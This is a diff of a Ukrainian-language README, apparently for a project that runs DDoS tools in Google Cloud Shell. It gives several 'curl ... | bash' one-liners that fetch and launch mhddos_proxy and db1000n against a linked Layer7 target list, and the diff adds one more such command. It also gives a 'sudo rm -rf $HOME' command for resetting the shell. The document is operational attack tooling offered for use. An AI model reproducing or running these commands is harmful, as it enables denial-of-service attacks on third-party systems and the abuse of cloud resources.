@@ -14,7 +14,7 @@
 • **Для скидання Cloud Shell** - Видаліть усі файли з домашнього каталогу, команда: `sudo rm -rf $HOME`, далі - у меню Cloud Shell клацніть значок меню з трьома крапками, а потім натисніть "Restart" *(Буде надано нову віртуальну машину, а домашній каталог буде відновлено до стану за замовчуванням)*
 #
 ### Стабільні сеанси (*90%*)
-:white_check_mark:**Команда для встановлення та запуску MHDDoS_proxy (по [Layer7](https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst)):**
+:white_check_mark:**Команда для встановлення та запуску mhddos_proxy (по [Layer7](https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst)):**
 ```
 curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
 ```
@@ -22,6 +22,10 @@ curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos
 ```
 curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/db1000n_GShell.sh | bash
 ``` 
+:white_check_mark:**Команда для встановлення та запуску mhddos_proxy** (*попередня менш продуктивна версія (**тільки проксі**)*):
+```
+curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m(proxy_only).sh | bash
+```
 #
 ### Тести/допрацювання/експерименти. 
 **Нестабільні сеанси, перериваються** (потрібно часто перевіряти)      
